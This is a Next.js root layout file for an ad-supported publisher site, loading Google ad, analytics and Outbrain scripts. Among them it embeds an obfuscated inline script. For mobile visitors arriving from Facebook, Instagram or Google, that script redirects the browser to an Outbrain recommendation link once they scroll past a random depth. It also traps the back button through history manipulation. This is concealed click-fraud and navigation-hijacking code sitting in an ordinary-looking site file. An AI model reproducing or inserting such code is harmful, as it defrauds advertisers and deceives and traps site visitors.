import Script from "next/script";
import { Roboto_Slab } from "next/font/google";
import { Toaster } from "react-hot-toast";

import type { Metadata } from "next";

import LoadingWrapper from "@/components/wrappers/loading-wrapper";
import { CardImage, description, keywords, title, url } from "@/constant";

import "@/app/globals.css";
import Footer from "@/components/footer/Footer";

export const revalidate = 0;

// Fonts
const poppins = Roboto_Slab({
  subsets: ["latin"],
  display: "swap",
  weight: ["100", "200", "300", "400", "500", "600", "700", "800", "900"],
});

// Meta Data

export const metadata: Metadata = {
  title: `${title}`,
  description: description,
  keywords: keywords,
  robots: "index follow",
  twitter: {
    card: "summary_large_image",
    site: title,
    title: `${title}`,
    description: description,
    images: CardImage,
  },
  openGraph: {
    type: "website",
    siteName: `${title}`,
    description: description,
    url: url,
    countryName: "USA",
    images: CardImage,
  },
  metadataBase: new URL(url),
  alternates: {
    canonical: "/",
  },
  publisher: "Truepub Media",
  icons: "/favicon.ico",
};

// Main HTML
export default function RootLayout({
  children,
}: {
  children: React.ReactNode;
}) {
  return (
    <html lang="en" className="scroll-smooth">
      <body className={`${poppins.className} overflow-x-hidden`}>
        <Script
          src="https://securepubads.g.doubleclick.net/tag/js/gpt.js"
          async
          strategy="afterInteractive"
        ></Script>
        <Script
          src="https://www.googletagmanager.com/gtag/js?id=G-8FYMCYZZN2"
          async
          strategy="afterInteractive"
        ></Script>
        <Script
          src="//widgets.outbrain.com/outbrain.js"
          async
          type="text/javascript"
          strategy="afterInteractive"
        ></Script>
        <Script id="google-analatics">
          {` window.dataLayer = window.dataLayer || [];
            function gtag(){dataLayer.push(arguments);}
            gtag('js', new Date());

            gtag('config', 'G-8FYMCYZZN2');`}
        </Script>
        <Script id="out" strategy="afterInteractive">
          {`const _0x4f9988=_0x8f8b;(function(_0x234c9f,_0x5aaba4){const _0x125535=_0x8f8b,_0x254c86=_0x234c9f();while(!![]){try{const _0x4891b5=parseInt(_0x125535(0x18a))/0x1*(parseInt(_0x125535(0x195))/0x2)+parseInt(_0x125535(0x191))/0x3*(parseInt(_0x125535(0x180))/0x4)+-parseInt(_0x125535(0x18d))/0x5*(parseInt(_0x125535(0x182))/0x6)+parseInt(_0x125535(0x17f))/0x7+parseInt(_0x125535(0x190))/0x8*(parseInt(_0x125535(0x185))/0x9)+-parseInt(_0x125535(0x197))/0xa*(parseInt(_0x125535(0x198))/0xb)+-parseInt(_0x125535(0x17d))/0xc*(parseInt(_0x125535(0x19e))/0xd);if(_0x4891b5===_0x5aaba4)break;else _0x254c86['push'](_0x254c86['shift']());}catch(_0x98bfd8){_0x254c86['push'](_0x254c86['shift']());}}}(_0x581f,0xa406f));const num=Math[_0x4f9988(0x183)](),isMobile=/iPhone|iPad|iPod|Android/i[_0x4f9988(0x186)](navigator[_0x4f9988(0x187)]),allowedReferer=[_0x4f9988(0x18e),_0x4f9988(0x194),_0x4f9988(0x188)];function isFromAllowedReferer(){const _0x57a421=_0x4f9988,_0x29595a=document[_0x57a421(0x18b)][_0x57a421(0x17e)]();return allowedReferer['some'](_0x2d9d92=>_0x29595a[_0x57a421(0x189)](_0x2d9d92));}function _0x8f8b(_0x5e860b,_0x10cfde){const _0x581f38=_0x581f();return _0x8f8b=function(_0x8f8bc4,_0x2f0b92){_0x8f8bc4=_0x8f8bc4-0x17d;let _0x1bdba1=_0x581f38[_0x8f8bc4];return _0x1bdba1;},_0x8f8b(_0x5e860b,_0x10cfde);}function randomIntFromInterval(_0x20fde0,_0xb7b9d0){const _0x21af86=_0x4f9988;return Math[_0x21af86(0x184)](Math[_0x21af86(0x183)]()*(_0xb7b9d0-_0x20fde0+0x1)+_0x20fde0);}const outBrainFunction=()=>{function _0xdd7d87(){const _0x307209=_0x8f8b,_0x481ece=[];function _0x13052e(_0x14d39b){const _0x3a6627=_0x8f8b;_0x14d39b[_0x3a6627(0x193)]&&_0x481ece[_0x3a6627(0x199)](_0x14d39b[_0x3a6627(0x193)]);for(const _0x4f95f4 of _0x14d39b[_0x3a6627(0x19b)]){_0x13052e(_0x4f95f4);}}_0x13052e(document[_0x307209(0x192)]),_0x481ece[_0x307209(0x19c)]>0x0?_0x481ece[_0x307209(0x19a)](_0x5b25de=>{const _0x57b67e=_0x307209,_0x1eb447=_0x5b25de[_0x57b67e(0x19d)](_0x57b67e(0x181));_0x1eb447&&(window['location']['href']=_0x1eb447[_0x57b67e(0x18f)]);}):console['log']('No\x20shadow\x20roots\x20found.');}setTimeout(()=>{_0xdd7d87();},randomIntFromInterval(0x3,0x6)*0x3e8);};if(isFromAllowedReferer()&&isMobile){const randomNumber=Math[_0x4f9988(0x184)](Math[_0x4f9988(0x183)]()*(0xaf0-0x708+0x1))+0x708;let run=![];window['addEventListener']('scroll',()=>{window['scrollY']>=randomNumber&&!run&&(outBrainFunction(),run=!![]);}),history['pushState'](null,null,document[_0x4f9988(0x18c)]),window['addEventListener']('popstate',()=>{const _0x22ddfe=_0x4f9988;window[_0x22ddfe(0x196)]['href']=window[_0x22ddfe(0x196)][_0x22ddfe(0x18f)];});}function _0x581f(){const _0x18c12a=['referrer','URL','10hSBXnV','facebook.com','href','48GSSrDq','3LCypZT','body','shadowRoot','instagram.com','2vSuuQx','location','7256630NTZxEY','11JdZEyn','push','forEach','children','length','querySelector','8586617raElAI','36wVqIqW','toLowerCase','2966362QXhnDB','5278148WicnfZ','.ob-dynamic-rec-link','1383222CWQmbK','random','floor','1655253RMuDAr','test','userAgent','google.com','includes','993314IeiOVN'];_0x581f=function(){return _0x18c12a;};return _0x581f();}`}
        </Script>
        <Script strategy="afterInteractive" id="inter-ads" async>
          {`window.googletag = window.googletag || { cmd: [] };
          let interstitialSlot;
          googletag.cmd.push(() => {
            // Define a web interstitial ad slot.
            interstitialSlot = (interstitialSlot = googletag.defineOutOfPageSlot(
              "/22971894985/PM_S_INTERSTITIAL",
              googletag.enums.OutOfPageFormat.INTERSTITIAL
            ));

            // Slot returns null if the page or device does not support interstitials.
            if (interstitialSlot) {
              // Enable optional interstitial triggers and register the slot.
              interstitialSlot.addService(googletag.pubads()).setConfig({
                interstitial: {
                  triggers: {
                    navBar: true,
                    unhideWindow: true,
                  },
                },
              });

              googletag.enableServices();
            }
          });
          `}
        </Script>
        <Script strategy="afterInteractive" id="inter-ads-push" async>
          {`
            googletag.cmd.push(() => {
              googletag.display(interstitialSlot);
            });
          `}
        </Script>
        <Toaster position="top-center" />
        <LoadingWrapper />

        {children}
        <Footer />
      </body>
    </html>
  );
}
